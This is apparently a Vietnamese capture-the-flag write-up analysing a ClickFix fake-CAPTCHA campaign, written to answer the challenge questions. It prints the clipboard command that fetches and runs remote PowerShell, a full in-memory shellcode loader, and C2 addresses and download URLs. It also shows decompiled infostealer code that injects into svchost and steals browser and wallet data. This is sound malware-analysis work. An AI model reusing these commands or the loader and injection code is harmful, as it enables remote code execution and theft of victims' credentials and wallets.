# Mr Robot

<img width="869" height="892" alt="image" src="https://github.com/user-attachments/assets/c790f63d-828c-40bf-8b74-765de85db65e" />

Challenge này mình sẽ chỉ có duy nhất 1 artifact là 1 cái url: **https://rededucation.aduma.online**.

Ở challenge này mình sẽ phân tích từng manh mối mà có được bên trong url kia, rồi sẽ thực hiện trả lời các câu hỏi được netcat đến ip:port - 161.33.2.236:31337. Đầu tiên khi mình search url kia thì nó sẽ hiện ra cho mình 1 ô recapcha:

<img width="932" height="440" alt="image" src="https://github.com/user-attachments/assets/899dc022-dc8d-4720-b9b9-19a5b1348d46" />

Thì kỹ thuật này mình có từng đọc trên một blog ở Facebook rồi thấy khá quen quen, thì khi victim thực hiện bắt đầu xác minh là con người, và hiện ra ô như trên, thì 1 command đã được dán sẳn vào phần clipboard rồi, và chỉ cần thực hiện theo attacker thì sẽ máy tính sẽ bắt đầu tải về payload, hoặc something else,...

Như mình đoán thì clipboard của mình sẽ có 1 lệnh powershell sau: `powershell -c iex(irm 152.42.186.220 -UseBasicParsing)`. Giờ mình sẽ check thử `http://152.42.186.220` để xem source là gì:

<img width="1999" height="1198" alt="image" src="https://github.com/user-attachments/assets/ff1fee85-4862-426f-819a-7bfc6b6e6d70" />

```
$u = "http://152.42.186.220/9cca20c6df659f72/m_cpt1267382.bin"



try {

    Write-Host "Loading..." 

    

    $d = Invoke-WebRequest -Uri $u -UseBasicParsing -ErrorAction Stop

    $b = $d.Content

    $s = $b.Length



    $c = @"

using System;

using System.Runtime.InteropServices;

public class W {

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);

    [DllImport("kernel32.dll", SetLastError=true)]

    public static extern uint WaitForSingleObject(IntPtr h, uint ms);

}

"@



    Add-Type -TypeDefinition $c



    $m1 = 0x1000

    $m2 = 0x2000

    $p = 0x40

    

    $addr = [W]::VirtualAlloc([IntPtr]::Zero, $s, $m1 -bor $m2, $p)

    

    if ($addr -eq [IntPtr]::Zero) {

        throw "Alloc failed"

    }



    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $addr, $s)

    

    $tid = 0

    $th = [W]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)

    

    if ($th -eq [IntPtr]::Zero) {

        throw "Thread failed"

    }



    [W]::WaitForSingleObject($th, 30000) | Out-Null

    Write-Host "done."

    

} catch {

    Write-Error $_.Exception.Message

    exit 1

}

Beta
0 / 0
used queries
1
```

Ở đây mình sẽ có được source của stage 1 thực hiện tải về 1 file `m_cpt1267382.bin` về máy của victim khi họ dán command powershell kia vào thanh run của `Win R`, toàn bộ source này thực hiện chức năng chính là tải về file payload ở stage 1 kia.

Có được lệnh powershell thực hiện tải về payload đầu thì mình cũng trả lời được câu hỏi đầu tiên của challenge:

```
Q1: What command did the compromised website tell you to run?
     (Example: ping google.com -t)
> powershell -c iex(irm 152.42.186.220 -UseBasicParsing)
```

Tiếp theo mình cần biết website load payload này là từ đâu, mình nghĩ nó cũng sẽ nằm bên trong trang web mà đề cho nên mình thử view source bằng `F12`:

<img width="1976" height="1476" alt="image" src="https://github.com/user-attachments/assets/3b8b4178-ab4a-431f-80f0-6a027d0b6e8c" />

Ở đây mình sẽ thấy bên trong thẻ `<script>` có 1 chuỗi base64 `aHR0cHM6Ly9qc3JlcG8uYWR1bWEub25saW5lL25ldy5qcz8=`, mình thực hiện decode thử thì có được 1 link url khác -> `https://jsrepo.aduma.online/new.js`

Tới đây khi mình truy cập vào thì mình thấy source của web này đã hoàn toàn bị obfuscated, tới đây mình có dùng tools deobfuscated của `https://obf-io.deobfuscate.io/`, nhưng mạng lag quá mình không load được script deobfus, nên mình nhờ AI deobfus hộ:

```
```

Tới đây mình sẽ biết được trang web thực hiện load malicious payload là: https://jsrepo.aduma.online/new.js, nên mình trả lời được câu hỏi thứ 2:

```
Q2: Where does the website load malicious payload from?
     (Example: 8.8.8.8, https://google.com)
> https://jsrepo.aduma.online/new.js
```

Kỹ thuật ở đây được sử dụng là kỹ thuật **filefix - clickfix** dựa vào victim tự load payload vào hệ thống mà attacker không thực hiện trực tiếp.

Bây giờ mình sẽ tải về file `m_cpt1267382.bin`, mình sử dụng tools detect it easy để xem file này được compiler bằng ngôn ngữ gì:

<img width="1264" height="930" alt="image" src="https://github.com/user-attachments/assets/8d002212-a820-4f42-8909-1a901237e64d" />

File được compiler bằng donut shellcode, tới đây mình search trên mạng về donut shellcode là gì?

> Shellcode donut là một bộ mã không phụ thuộc vào vị trí của nó trong bộ nhớ, nó cho phép thực thi các file VBscript, Javascript, thực hiện load các file `.exe`, tự động embeded `.DLL` vào hệ thống. Một module do Donut tạo có thể được staged bởi 1 server C2 hoặc từ chính chương trình được load bên trong nó. Điểm đặc biệt là module này encrypt bằng cách sử dụng block cipher **Chaskey** và khóa được tạo ngẫu nhiên 128-bit, và sau khi file shellcode được load vào bộ nhớ nó sẽ có khả năng tự xóa đi các refernce gốc để tránh bị hệ thống scan.
>

Đây là một dạng shellcode byte và mình cần có một tools để decryptor ở [đây](https://github.com/volexity/donut-decryptor)

<img width="3793" height="1867" alt="image" src="https://github.com/user-attachments/assets/a43a946d-f497-4a58-9f12-ee6fc8962a31" />

Thực hiện `git clone` nó về và tải toàn bộ repo bằng lệnh `python3 -m pip install .`

Sau khi tải xong thì mình dùng lệnh sau để thực hiện decryptor toàn bộ file shellcode:

```
donut-decryptor m_cpt_bld172638.bin
```
<img width="1501" height="328" alt="image" src="https://github.com/user-attachments/assets/90975b5c-dd23-40c1-bab9-6509fcfaff3d" />

Sau đó mở ida lên để phân tích file module_pe.exe mà tools vừa parse ra, thông thường thì khi mình sài ida để phân tích thì mình sẽ bắt đầu view strings để bắt đầu tìm các chuỗi liên quan đến host ip hoặc gì đó:

<img width="1919" height="1017" alt="image" src="https://github.com/user-attachments/assets/113e1841-4307-4d72-bec7-7171286c1cb9" />

Tới đây mình bắt đầu nhấp vào từng chuỗi để xem mã giả của từng hàm để xem logic của hàm là gì:

<details>
<summary>sub_140001582()</summary>
    
```c
// positive sp value has been detected, the output may be wrong!

__int64 sub_140001582()
{
  __int64 v0; // rdx
  __int64 v1; // rbx
  void *v2; // rax
  void *v3; // rbp
  void *v4; // rax
  void *v5; // r13
  __int64 result; // rax
  void *v7; // rax
  void *v8; // r12
  void (__stdcall *v9)(HINTERNET); // rbx
  unsigned int v10; // r15d
  unsigned int v11; // r14d
  void *v12; // rax
  int i; // eax
  unsigned int v14; // eax
  void *v15; // rax
  unsigned int v16; // [rsp+6Ch] [rbp-204Ch] BYREF
  _BYTE v17[8232]; // [rsp+70h] [rbp-2048h] BYREF

  sub_140002C80();
  v1 = v0;
  v2 = WinHttpOpen("m", 0, 0, 0, 0);
  v3 = v2;
  if ( !v2 )
    return 0;
  WinHttpSetTimeouts(v2, 30000, 30000, 30000, 30000);
  v4 = WinHttpConnect(v3, L"152.42.203.28", 0x50u, 0);
  v5 = v4;
  if ( !v4 )
  {
    WinHttpCloseHandle(v3);
    return 0;
  }
  v7 = WinHttpOpenRequest(v4, L"GET", L"/9cca20c6df659f72/m_cpt_bld172638.bin", 0, 0, 0, 0);
  v8 = v7;
  if ( !v7 )
  {
    v9 = (void (__stdcall *)(HINTERNET))WinHttpCloseHandle;
    WinHttpCloseHandle(v5);
LABEL_19:
    v9(v3);
    return 0;
  }
  if ( !WinHttpSendRequest(v7, 0, 0, 0, 0, 0, 0)
    || !WinHttpReceiveResponse(v8, 0)
    || (v10 = 0, v11 = 0x2000, v16 = 0, v12 = malloc(0x2000u), (*(_QWORD *)v1 = v12) == 0) )
  {
LABEL_18:
    v9 = (void (__stdcall *)(HINTERNET))WinHttpCloseHandle;
    WinHttpCloseHandle(v8);
    WinHttpCloseHandle(v5);
    goto LABEL_19;
  }
  for ( i = ((__int64 (__fastcall *)(void *, _BYTE *, __int64, unsigned int *))WinHttpReadData)(v8, v17, 0x2000, &v16);
        i && v16;
        i = ((__int64 (__fastcall *)(void *, _BYTE *, __int64, unsigned int *))WinHttpReadData)(v8, v17, 0x2000, &v16) )
  {
    v14 = v10 + v16;
    if ( v11 < v10 + v16 )
    {
      v11 = v14 + 0x2000;
      v15 = realloc(*(void **)v1, v14 + 0x2000);
      if ( !v15 )
      {
        free(*(void **)v1);
        *(_QWORD *)v1 = 0;
        goto LABEL_18;
      }
      *(_QWORD *)v1 = v15;
    }
    qmemcpy((void *)(*(_QWORD *)v1 + v10), v17, v16);
    v10 += v16;
  }
  WinHttpCloseHandle(v8);
  WinHttpCloseHandle(v5);
  WinHttpCloseHandle(v3);
  *(_DWORD *)(v1 + 8) = v10;
  result = 1;
  if ( !v10 )
  {
    free(*(void **)v1);
    *(_QWORD *)v1 = 0;
    return 0;
  }
  return result;
}
```
</details>

> Tóm tắt toàn bộ hàm thực hiện kết nối đến server C2: **152.42.203.28** và thực hiện tải về file payload stage 2: **m_cpt_bld172638.bin**. Hơn nữa chúng ta biết được attacker đã thiết kế thêm 1 giá trị `v4` nhận user agent được viết theo chuỗi strings Little Endian: `misssav`, và khi thực hiện tải payload từ C2 về máy nạn nhân thì malware sẽ tự thực hiện thêm user agent phía trước, và phía sau là phần url đến file tải về từ C2 server.
>

<img width="909" height="153" alt="image" src="https://github.com/user-attachments/assets/46d34477-2da9-43db-a839-a39b80fca323" />

Ở đây mình sẽ giải quyết tiếp được câu hỏi tiếp theo trong context của challenge:

```
Q3: Name of the binary file that powershell loaded?
     (Example: cmd.exe)
> m_cpt1267382.bin

```
Khi mình bắt đầu tìm các chuỗi được sử dụng trong file malware của stage 1 thì mình cũng thấy được có 1 tiến trình được gọi đến là `svchost.exe`, giờ mình sẽ phân tích qua về hàm gọi tiến trình `svchost.exe`:

<details>
<summary> sub_140001885()</summary>

```c
__int64 sub_140001885()
{
  HANDLE Toolhelp32Snapshot; // rax
  void *v1; // rbx
  BOOL i; // eax
  HANDLE v4; // rsi
  BOOL Wow64Process; // [rsp+24h] [rbp-264h] BYREF
  tagPROCESSENTRY32W pe; // [rsp+28h] [rbp-260h] BYREF

  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v1 = Toolhelp32Snapshot;
  if ( Toolhelp32Snapshot == (HANDLE)-1LL )
    return 0;
  pe.dwSize = 568;
  for ( i = Process32FirstW(Toolhelp32Snapshot, &pe); ; i = Process32NextW(v1, &pe) )
  {
    if ( !i )
    {
      CloseHandle(v1);
      return 0;
    }
    if ( !wcsicmp(pe.szExeFile, L"svchost.exe") )
    {
      v4 = OpenProcess(0x1000u, 0, pe.th32ProcessID);
      if ( v4 )
        break;
    }
LABEL_12:
    ;
  }
  Wow64Process = 0;
  if ( !IsWow64Process(v4, &Wow64Process) || Wow64Process )
  {
    CloseHandle(v4);
    goto LABEL_12;
  }
  CloseHandle(v4);
  CloseHandle(v1);
  return pe.th32ProcessID;
}
```
</details>

Bên trong mình sẽ thấy hàm `sub_140001885()` nó có set 1 đối tượng là: `tagPROCESSENTRY32W pe` thì `pe` sẽ nhận giá trị tiến trình mà payload sẽ load vào để thực hiện gọi đến tiến trình `svchost.exe`, thì mình cũng thắc mắc tại sao lại cần làm như thế thay vì tự nó chạy 1 process riêng biệt trong hệ thống, mình có googling về **Injector Process**, thì hiểu được:

> Khi chính malware tự thực hiện tạo 1 process từ việc nhận memory từ CPU, thì khi đó nếu victim thấy có gì khác thường và check task manager sẽ thấy cái tiến trình độc hại -> Qua đó cần inject vào 1 process trông liêm trong hệ thống, thì `svchost.exe` gần như là tiến trình luôn chạy trong hệ thống và đặc biệt không bị firewall quét qua.
>
> Attacker dựa vào đó thực hiện inject shellcode donut stage1 vào 1 phần memory của process `svchost.exe` và thực hiện 2 hành vi: tải về payload stage2 và thực hiện decryptor shellcode donut của stage2.

Nên mình cũng sẽ trả lời tiếp được câu hỏi thứ 4:

```
Q4: What process does this binary inject into?
     (Example: notepad.exe)
> svchost.exe
```

Tiếp theo mình tải về payload stage2 bằng lệnh `wget -U missav http://152.42.203.28/9cca20c6df659f72/m_cpt_bld1726`, rồi tiếp tục detect bằng detect it easy thì file này cũng được encrypt bằng shellcode donut:

<img width="902" height="664" alt="image" src="https://github.com/user-attachments/assets/02088760-ff21-4202-97d0-016b60c57913" />

Mình vẫn sẽ tiếp tục dùng tools `donut-decryptor` để decryptor ra file module_stage2.exe, sau đó tiếp tục check file module_stage2.exe này được compiler bằng ngôn ngữ gì:

<img width="1264" height="923" alt="image" src="https://github.com/user-attachments/assets/ab4c37b3-ac96-43e7-9562-18b93c2cf277" />

Mình có file vẫn được compiler bằng C/C++ nên vẫn sẽ thực hiện reverse bằng ida tiếp, và mình sẽ bắt đầu từ phần xem các chuỗi strings của file xem có moi được 1 url hay server host nào tiếp khong:

<img width="1782" height="1390" alt="image" src="https://github.com/user-attachments/assets/4cf48484-10a3-496a-a9ce-d983a4f69f01" />

Ngay đây mình sẽ thấy được có rất nhiều chuỗi liên quan đến các browser, wallet, và có cả các tiến trình như msedge.exe và chrome.exe, nên mình nghĩ stage 2 này đang thực hiện khai thác các thông tin browser và phần ví của victim.

Khi mình tiếp tục tìm kiếm các chuỗi khác thì sẽ tìm được 1 url đến file `install.msi và chromelevator.bin`:

<img width="2895" height="1516" alt="image" src="https://github.com/user-attachments/assets/50e0a8be-150f-4417-9f63-45272cc8b51a" />

<details>
<summary>sub_1400018CD()</summary>

```c
// positive sp value has been detected, the output may be wrong!
__int64 sub_1400018CD()
{
  __int64 v0; // rcx
  char *v1; // rdi
  int KeyboardLayoutList; // eax
  int v3; // esi
  HKL *v4; // rax
  HKL *v5; // rbx
  __int64 v6; // rax
  int v7; // ebx
  int v8; // eax
  char v9; // dl
  char v10; // al
  bool v11; // zf
  void *v12; // rbp
  DWORD TickCount; // eax
  HANDLE FileA; // rax
  void *v15; // r13
  DWORD *v16; // rdi
  __int64 i; // rcx
  struct _PROCESS_INFORMATION *v18; // rdi
  __int64 v19; // rcx
  void **v20; // rax
  void **v21; // rdi
  int v22; // eax
  CHAR *v23; // rax
  HANDLE Thread; // rax
  HANDLE MutexA; // rbx
  int v26; // ebp
  __int64 v27; // rdi
  __int64 v28; // rax
  int v29; // r13d
  __int64 j; // rdi
  __int64 v31; // rax
  __int64 k; // rdi
  __int64 v33; // rax
  char *v34; // r13
  int v35; // r13d
  __int64 m; // rdi
  __int64 v37; // rax
  void *v38; // rbx
  DWORD CurrentProcessId; // eax
  HANDLE Toolhelp32Snapshot; // r13
  __int64 v41; // rcx
  PROCESSENTRY32W *v42; // rdi
  BOOL n; // eax
  DWORD th32ProcessID; // esi
  HANDLE v45; // rdi
  HANDLE v46; // rax
  void *v47; // rsi
  DWORD (__stdcall *v48)(LPVOID); // r13
  HANDLE RemoteThread; // rax
  void *v50; // rdi
  LPVOID v51; // rax
  void *v52; // r13
  HANDLE v53; // rax
  void *v54; // rsi
  DWORD *v55; // rbx
  int v56; // r13d
  int v57; // eax
  int v58; // r15d
  int v59; // r12d
  HANDLE v60; // rbx
  DWORD v61; // eax
  HANDLE FirstFileA; // rdi
  BOOL NextFileA; // esi
  int v64; // eax
  char v65; // si
  DWORD v67; // [rsp+DCh] [rbp-1A0Ch]
  int v68; // [rsp+E8h] [rbp-1A00h]
  _DWORD v69[2]; // [rsp+ECh] [rbp-19FCh] BYREF
  unsigned int v70; // [rsp+F4h] [rbp-19F4h]
  DWORD v71; // [rsp+F8h] [rbp-19F0h] BYREF
  __int64 v72; // [rsp+FCh] [rbp-19ECh] BYREF
  struct _SYSTEMTIME v73; // [rsp+104h] [rbp-19E4h] BYREF
  CHAR v74[16]; // [rsp+114h] [rbp-19D4h] BYREF
  CHAR v75[32]; // [rsp+124h] [rbp-19C4h] BYREF
  char v76[64]; // [rsp+144h] [rbp-19A4h] BYREF
  CHAR v77[64]; // [rsp+184h] [rbp-1964h] BYREF
  char v78[64]; // [rsp+1C4h] [rbp-1924h] BYREF
  char v79[64]; // [rsp+204h] [rbp-18E4h] BYREF
  CHAR v80[64]; // [rsp+244h] [rbp-18A4h] BYREF
  CHAR v81[64]; // [rsp+284h] [rbp-1864h] BYREF
  CHAR v82[64]; // [rsp+2C4h] [rbp-1824h] BYREF
  BYTE v83[128]; // [rsp+304h] [rbp-17E4h] BYREF
  char v84[128]; // [rsp+384h] [rbp-1764h] BYREF
  BYTE v85[128]; // [rsp+404h] [rbp-16E4h] BYREF
  BYTE v86[128]; // [rsp+484h] [rbp-1664h] BYREF
  DWORD v87[32]; // [rsp+504h] [rbp-15E4h] BYREF
  DWORD v88[65]; // [rsp+584h] [rbp-1564h] BYREF
  struct _PROCESS_INFORMATION v89[11]; // [rsp+688h] [rbp-1460h] BYREF
  struct _STARTUPINFOA v90[2]; // [rsp+790h] [rbp-1358h] BYREF
  DWORD v91[64]; // [rsp+898h] [rbp-1250h] BYREF
  char v92; // [rsp+99Bh] [rbp-114Dh]
  BOOL v93[64]; // [rsp+99Ch] [rbp-114Ch] BYREF
  char v94; // [rsp+A9Fh] [rbp-1049h]
  PROCESSENTRY32W v95[7]; // [rsp+AA0h] [rbp-1048h] BYREF

  sub_14001F600();
  v0 = 16;
  v1 = v76;
  while ( v0 )
  {
    *(_DWORD *)v1 = 0;
    v1 += 4;
    --v0;
  }
  v72 = 0;
  if ( ((unsigned __int16)GetKeyboardLayout(0) & 0x3FF) == 0x19 )
    return 0;
  KeyboardLayoutList = GetKeyboardLayoutList(0, 0);
  v3 = KeyboardLayoutList;
  if ( KeyboardLayoutList > 0 )
  {
    v4 = (HKL *)malloc(8LL * KeyboardLayoutList);
    v5 = v4;
    if ( v4 )
    {
      GetKeyboardLayoutList(v3, v4);
      v6 = 0;
      do
      {
        if ( ((unsigned __int16)v5[v6] & 0x3FF) == 0x19 )
        {
          free(v5);
          return 0;
        }
        ++v6;
      }
      while ( v3 > (int)v6 );
      free(v5);
    }
  }
  v7 = 3;
  sub_140002ACB(v83, v77, v84);
  while ( 1 )
  {
    v8 = sub_14000577B("152.42.203.28", 64, (__int64)&v72);
    if ( v8 == 1 )
      break;
    if ( v8 == -1 )
      return 0;
    if ( !--v7 )
      return 0;
    Sleep(0xBB8u);
  }
  v9 = v72;
  if ( !(_BYTE)v72 )
    goto LABEL_63;
  v10 = BYTE1(v72);
  if ( !BYTE1(v72) )
    goto LABEL_63;
  if ( (v72 & 0xDF) == 0x52 )
  {
    v11 = (BYTE1(v72) & 0xDF) == 85;
  }
  else
  {
    if ( (v72 & 0xDF) != 0x42 )
      goto LABEL_24;
    v11 = (BYTE1(v72) & 0xDF) == 89;
  }
  if ( v11 )
    return 0;
LABEL_24:
  if ( (unsigned __int8)(v72 - 97) <= 0x19u )
    v9 = v72 - 32;
  if ( (unsigned __int8)(BYTE1(v72) - 97) <= 0x19u )
    v10 = BYTE1(v72) - 32;
  if ( (v9 != 85 || v10 != 83)
    && (v9 != 67 || v10 != 65)
    && (v9 != 71 || v10 != 66)
    && (v9 != 65 || v10 != 85)
    && (v9 != 68 || v10 != 69)
    && (v9 != 70 || v10 != 82) )
  {
    goto LABEL_63;
  }
  v87[0] = 0;
  v12 = (void *)sub_140002B8F("http://138.2.62.171:443/install.msi");
  if ( !v12 )
    goto LABEL_63;
  if ( v87[0] )
  {
    if ( GetTempPathA(0x104u, (LPSTR)v91) )
    {
      v92 = 0;
      TickCount = GetTickCount();
      wsprintfA((LPSTR)v93, "%s~vrf%lu.msi", (const char *)v91, TickCount);
      FileA = CreateFileA((LPCSTR)v93, 0x40000000u, 0, 0, 2u, 0x180u, 0);
      v15 = FileA;
      if ( FileA != (HANDLE)-1LL )
      {
        if ( WriteFile(FileA, v12, v87[0], v88, 0) && v88[0] == v87[0] )
        {
          CloseHandle(v15);
          free(v12);
          wsprintfA((LPSTR)v95, "msiexec.exe /i \"%s\" /qn", (const char *)v93);
          v16 = &v90[0].cb + 1;
          for ( i = 25; i; --i )
            *v16++ = 0;
          v18 = v89;
          v19 = 6;
          v90[0].cb = 104;
          while ( v19 )
          {
            LODWORD(v18->hProcess) = 0;
            v18 = (struct _PROCESS_INFORMATION *)((char *)v18 + 4);
            --v19;
          }
          v90[0].dwFlags = 1;
          if ( CreateProcessA(0, (LPSTR)v95, 0, 0, 0, 0x8000000u, 0, (LPCSTR)v91, v90, v89) )
          {
            CloseHandle(v89[0].hThread);
            v20 = (void **)malloc(0x10u);
            v21 = v20;
            if ( v20 )
            {
              *v20 = v89[0].hProcess;
              v22 = lstrlenA((LPCSTR)v93);
              v23 = (CHAR *)malloc(v22 + 1);
              v21[1] = v23;
              if ( v23 )
              {
                lstrcpyA(v23, (LPCSTR)v93);
                Thread = CreateThread(0, 0, StartAddress, v21, 0, 0);
                if ( Thread )
                {
                  CloseHandle(Thread);
                  goto LABEL_63;
                }
                free(v21[1]);
                CloseHandle(v89[0].hProcess);
                free(v21);
              }
              else
              {
                CloseHandle(v89[0].hProcess);
                free(v21);
              }
            }
            else
            {
              CloseHandle(v89[0].hProcess);
            }
          }
          DeleteFileA((LPCSTR)v93);
          goto LABEL_63;
        }
        CloseHandle(v15);
        DeleteFileA((LPCSTR)v93);
      }
    }
  }
  free(v12);
LABEL_63:
  MutexA = CreateMutexA(0, 1, "Global\\sysinfo_single_instance");
  if ( GetLastError() == 183 )
  {
    if ( MutexA )
      CloseHandle(MutexA);
    return 0;
  }
  v26 = sub_140006E40();
  if ( v26 )
    return 0;
  v27 = 0;
  ((void (__fastcall *)(char *, char *))sub_1400027E1)(v78, v79);
  sub_14000281B(v85, v80, v86, (__int64)v69);
  sub_140002949((LPSTR)v87, v81, v75, v74);
  sub_140002A55(v82);
  ((void (__fastcall *)(DWORD *))sub_140002B41)(v88);
  sub_140005125((LPSTR)v89);
  GetSystemTime(&v73);
  wsprintfA(
    (LPSTR)v90,
    "%s\\sysinfo_%s_%s_%02d%02d%04d%02d%02d",
    (const char *)v89,
    (const char *)&v72,
    v76,
    v73.wDay,
    v73.wMonth,
    v73.wYear,
    v73.wHour,
    v73.wMinute);
  CreateDirectoryA((LPCSTR)v90, 0);
  ((void (__fastcall *)(struct _STARTUPINFOA *))sub_140006D6E)(v90);
  v93[0] = 0;
  ((void (__fastcall *)(PROCESSENTRY32W *, BOOL *))sub_14000361A)(v95, v93);
  if ( v93[0] > 0 )
  {
    while ( v93[0] > (int)v27 )
    {
      v28 = *((int *)&v95[0].dwSize + v27);
      if ( (unsigned int)v28 <= 7 )
        sub_140001541(&aChrome[128 * v28 + 96]);
      ++v27;
    }
    v29 = 50;
LABEL_73:
    for ( j = 0; v93[0] > (int)j; ++j )
    {
      v31 = *((int *)&v95[0].dwSize + j);
      if ( (unsigned int)v31 <= 7 && (unsigned int)sub_1400014B9(&aChrome[128 * v31 + 96]) )
      {
        Sleep(0x12Cu);
        if ( --v29 )
          goto LABEL_73;
        break;
      }
    }
    for ( k = 0; v93[0] > (int)k; ++k )
    {
      v33 = *((int *)&v95[0].dwSize + k);
      if ( (unsigned int)v33 <= 7 )
      {
        v34 = &aChrome[128 * v33 + 96];
        if ( (unsigned int)sub_1400014B9(v34) )
        {
          sub_140001541(v34);
          Sleep(0x7D0u);
        }
      }
    }
    v35 = 20;
LABEL_86:
    for ( m = 0; v93[0] > (int)m; ++m )
    {
      v37 = *((int *)&v95[0].dwSize + m);
      if ( (unsigned int)v37 <= 7 && (unsigned int)sub_1400014B9(&aChrome[128 * v37 + 96]) )
      {
        Sleep(0xFAu);
        if ( --v35 )
          goto LABEL_86;
        break;
      }
    }
    ((void (__fastcall *)(PROCESSENTRY32W *, BOOL, struct _STARTUPINFOA *))sub_140003DEB)(v95, v93[0], v90);
  }
  ((void (__fastcall *)(struct _STARTUPINFOA *))sub_1400088F0)(v90);
  if ( !(unsigned int)sub_1400034F1() )
    goto LABEL_131;
  v70 = 0;
  v38 = (void *)sub_140002B8F("http://138.2.62.171:443/chromelevator.bin");
  if ( !v38 )
    goto LABEL_126;
  if ( v70 <= 3 )
    goto LABEL_125;
  CurrentProcessId = GetCurrentProcessId();
  v71 = 0;
  v67 = CurrentProcessId;
  ProcessIdToSessionId(CurrentProcessId, &v71);
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( Toolhelp32Snapshot == (HANDLE)-1LL )
    goto LABEL_121;
  v41 = 142;
  v42 = v95;
  while ( v41 )
  {
    v42->dwSize = 0;
    v42 = (PROCESSENTRY32W *)((char *)v42 + 4);
    --v41;
  }
  v95[0].dwSize = 568;
  for ( n = Process32FirstW(Toolhelp32Snapshot, v95); ; n = Process32NextW(Toolhelp32Snapshot, v95) )
  {
    if ( !n )
    {
      th32ProcessID = 0;
      goto LABEL_113;
    }
    if ( !_wcsicmp(v95[0].szExeFile, aS_8) && v67 != v95[0].th32ProcessID )
    {
      v91[0] = 0;
      if ( ProcessIdToSessionId(v95[0].th32ProcessID, v91) )
      {
        if ( v91[0] == v71 )
        {
          v45 = OpenProcess(0x42Au, 0, v95[0].th32ProcessID);
          if ( v45 )
            break;
        }
      }
    }
LABEL_112:
    ;
  }
  v93[0] = 0;
  if ( !IsWow64Process(v45, v93) || v93[0] )
  {
    CloseHandle(v45);
    goto LABEL_112;
  }
  th32ProcessID = v95[0].th32ProcessID;
  CloseHandle(v45);
LABEL_113:
  CloseHandle(Toolhelp32Snapshot);
  if ( th32ProcessID )
  {
    v46 = OpenProcess(0x42Au, 0, th32ProcessID);
    v47 = v46;
    if ( v46 )
    {
      v48 = (DWORD (__stdcall *)(LPVOID))VirtualAllocEx(v46, 0, v70, 0x3000u, 0x40u);
      if ( v48 )
      {
        if ( WriteProcessMemory(v47, v48, v38, v70, 0) )
        {
          RemoteThread = CreateRemoteThread(v47, 0, 0, v48, 0, 0, 0);
          v50 = RemoteThread;
          if ( RemoteThread )
          {
            WaitForSingleObject(RemoteThread, 0x7530u);
            CloseHandle(v50);
          }
        }
        VirtualFreeEx(v47, v48, 0, 0x8000u);
      }
      CloseHandle(v47);
    }
    goto LABEL_125;
  }
LABEL_121:
  v51 = VirtualAlloc(0, v70, 0x3000u, 0x40u);
  v52 = v51;
  if ( v51 )
  {
    qmemcpy(v51, v38, v70);
    v53 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)v51, 0, 0, 0);
    v54 = v53;
    if ( v53 )
    {
      WaitForSingleObject(v53, 0x7530u);
      CloseHandle(v54);
    }
    VirtualFree(v52, 0, 0x8000u);
  }
LABEL_125:
  free(v38);
LABEL_126:
  v55 = v91;
  v56 = 30;
  wsprintfA((LPSTR)v91, "%s\\chromelevator_output", (const char *)v89);
  wsprintfA((LPSTR)v95, "%s\\Browsers", (const char *)v90);
  while ( GetFileAttributesA((LPCSTR)v91) == -1 )
  {
    Sleep(0x3E8u);
    if ( !--v56 )
    {
      v55 = (DWORD *)v93;
      GetTempPathA(0x104u, (LPSTR)v93);
      v94 = 0;
      v57 = lstrlenA((LPCSTR)v93);
      wsprintfA((LPSTR)v93 + v57, "chromelevator_output");
      if ( GetFileAttributesA((LPCSTR)v93) == -1 )
        goto LABEL_131;
      break;
    }
  }
  CreateDirectoryA((LPCSTR)v95, 0);
  ((void (__fastcall *)(DWORD *, PROCESSENTRY32W *))sub_1400048FA)(v55, v95);
  ((void (__fastcall *)(DWORD *))sub_1400017C0)(v55);
LABEL_131:
  if ( (unsigned int)sub_1400044F0() )
    ((void (__fastcall *)(struct _STARTUPINFOA *))sub_14000457A)(v90);
  if ( (unsigned int)sub_1400034F1() )
    ((void (__fastcall *)(struct _STARTUPINFOA *))sub_140003783)(v90);
  ((void (__fastcall *)(struct _STARTUPINFOA *))sub_140004099)(v90);
  ((void (__fastcall *)(struct _STARTUPINFOA *))sub_1400088EB)(v90);
  v58 = v69[0];
  v59 = v69[1];
  wsprintfA((LPSTR)v93, "%s\\SystemInfo.txt", (const char *)v90);
  v60 = CreateFileA((LPCSTR)v93, 0x40000000u, 0, 0, 2u, 0x80u, 0);
  if ( v60 != (HANDLE)-1LL )
  {
    wsprintfA(
      (LPSTR)v95,
      "Ip: %s\r\n"
      "Country: %s\r\n"
      "\r\n"
      "Date: %s\r\n"
      "MachineID: %s\r\n"
      "GUID: %s\r\n"
      "HWID: %s\r\n"
      "\r\n"
      "Path: %s\r\n"
      "\r\n"
      "Windows: %s\r\n"
      "Install Date: %s\r\n"
      "AV: Windows Defender\r\n"
      "Computer Name: %s\r\n"
      "User Name: %s\r\n"
      "Display Resolution: %s\r\n"
      "Keyboard Languages: %s\r\n"
      "Local Time: %s\r\n"
      "TimeZone: %d\r\n"
      "\r\n"
      "[Hardware]\r\n"
      "Processor: %s\r\n"
      "Cores: %lu\r\n"
      "Threads: %lu\r\n"
      "RAM: %s\r\n"
      "VideoCard: %s\r\n",
      v76,
      (const char *)&v72,
      v82,
      (const char *)v83,
      v77,
      v84,
      (const char *)v88,
      (const char *)v85,
      v80,
      v78,
      v79,
      v75,
      v74,
      v82,
      v59,
      (const char *)v86,
      v68,
      v58,
      v81,
      (const char *)v87);
    v61 = lstrlenA((LPCSTR)v95);
    WriteFile(v60, v95, v61, v91, 0);
    CloseHandle(v60);
  }
  if ( (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001657)(v90, "Wallets")
    || (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001657)(
                       v90,
                       "BrowserPassManagers")
    || (unsigned int)((__int64 (__fastcall *)(struct _STARTUPINFOA *, const char *))sub_140001712)(v90, "Wallets")
